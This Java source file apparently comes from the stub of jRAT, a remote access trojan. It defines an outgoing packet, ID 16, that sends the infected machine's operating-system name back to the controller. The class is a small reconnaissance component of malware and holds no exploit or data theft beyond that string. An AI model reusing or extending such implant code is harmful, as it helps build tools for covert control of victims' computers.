package pro.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.common.io.StringWriter;

public class Packet16InitOperatingSystem extends AbstractOutgoingPacket {

	private String os;

	public Packet16InitOperatingSystem(String os) {
		this.os = os;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(os);
	}

	@Override
	public byte getPacketId() {
		return (byte) 16;
	}
}
